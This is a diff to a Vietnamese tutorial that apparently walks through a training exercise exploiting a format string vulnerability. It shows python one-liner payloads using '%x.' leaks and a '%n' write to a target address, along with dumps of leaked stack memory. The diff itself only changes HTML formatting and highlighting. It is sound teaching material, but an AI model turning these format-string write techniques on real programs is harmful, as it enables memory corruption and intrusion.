@@ -88,9 +88,9 @@ python -c "print 'AAAA' + '%x.' * 200"
 Sau khi đọc và in ra chuỗi, chúng ta sẽ tìm được vị trí mà formatted string này được lưu, bằng cách tìm vị trí mà giá trị `0x41414141` (tương đương với chuỗi `AAAA`) trong chuỗi in ra.
 Dưới đây là ví dụ về chuỗi in ra. Đoạn giá trị cần tìm được <span style="color:aqua">highlight</span>.
 
-```bash
+<pre class="memory">
 AAAA804960c.bffff568.8048469.b7fd8304.b7fd7ff4.bffff568.8048435.bffff732.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff5e8.b7eadc76.2.bffff614.bffff620.b7fe1848.bffff5d0.ffffffff.b7ffeff4.804824d.1.bffff5d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff5e8.b9394216.936bd406.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff614.8048450.8048440.b7ff1040.bffff60c.b7fff8f8.2.bffff72a.bffff732.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff70b.1f.bfffffe1.f.bffff71b.0.0.0.8a000000.d18b3605.c6b4a369.b1fa337a.6931d8ec.363836.0.0.6f660000.74616d72.<span style="color:aqua">4141</span>0031.7825<span style="color:aqua">4141</span>.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
-```
+</pre>
 
 Vị trí tìm được tương đương với `esp + 0x202`. Khoảng cách này là 514 byte.
 Chúng ta cũng nhận thấy sẽ có 2 byte lẻ do hiệu ứng của padding, khiến cho chuỗi bắt đầu `AAAA` bị tách ra làm 2 như đã highlight.
@@ -119,7 +119,7 @@ Cuối cùng, ta sẽ đổi chuổi thành.
 python -c "print 'AAAA' + '%x.' * 127 + 'a'"
 ```
 <pre class="memory">
-AAAA804960c.bffff648.8048469.b7fd8304.b7fd7ff4.bffff648.8048435.bffff80c.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6c8.b7eadc76.2.bffff6f4.bffff700.b7fe1848.bffff6b0.ffffffff.b7ffeff4.804824d.1.bffff6b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6c8.3ba998e9.11fd4ef9.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6f4.8048450.8048440.b7ff1040.bffff6ec.b7fff8f8.2.bffff804.bffff80c.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7eb.1f.bfffffe1.f.bffff7fb.0.0.0.4b000000.9c80dc29.b2cb6222.7ef80e2c.696901de.363836.0.6d726f66.317461.41414141.a
+AAAA804960c.bffff648.8048469.b7fd8304.b7fd7ff4.bffff648.8048435.bffff80c.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6c8.b7eadc76.2.bffff6f4.bffff700.b7fe1848.bffff6b0.ffffffff.b7ffeff4.804824d.1.bffff6b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6c8.3ba998e9.11fd4ef9.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6f4.8048450.8048440.b7ff1040.bffff6ec.b7fff8f8.2.bffff804.bffff80c.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7eb.1f.bfffffe1.f.bffff7fb.0.0.0.4b000000.9c80dc29.b2cb6222.7ef80e2c.696901de.363836.0.6d726f66.317461.<span style="color:aqua">41414141</span>.a
 </pre>
 
 Tuy nhiên khi kiểm tra chuỗi mới này, `0x41414141` vẫn xuất hiện.
@@ -144,7 +144,7 @@ Kết quả ta được.
 python -c "print '\x38\x96\x04\x08' + '%x.' * 126 + '%n' + 'a\n'"
 ```
 <pre class="memory">
-8804960c.bffff648.8048469.b7fd8304.b7fd7ff4.bffff648.8048435.bffff80c.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6c8.b7eadc76.2.bffff6f4.bffff700.b7fe1848.bffff6b0.ffffffff.b7ffeff4.804824d.1.bffff6b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6c8.97f7272f.bda3f13f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6f4.8048450.8048440.b7ff1040.bffff6ec.b7fff8f8.2.bffff804.bffff80c.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7eb.1f.bfffffe1.f.bffff7fb.0.0.0.a7000000.c336e748.2128340d.193064ab.69d4c2b3.363836.0.6d726f66.317461.aayou have modified the target :)
+8804960c.bffff648.8048469.b7fd8304.b7fd7ff4.bffff648.8048435.bffff80c.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6c8.b7eadc76.2.bffff6f4.bffff700.b7fe1848.bffff6b0.ffffffff.b7ffeff4.804824d.1.bffff6b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6c8.97f7272f.bda3f13f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6f4.8048450.8048440.b7ff1040.bffff6ec.b7fff8f8.2.bffff804.bffff80c.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7eb.1f.bfffffe1.f.bffff7fb.0.0.0.a7000000.c336e748.2128340d.193064ab.69d4c2b3.363836.0.6d726f66.317461.aa<span style="color:aqua">you have modified the target :)</span>
 </pre>
 
 Mục tiêu đã hoàn thành!
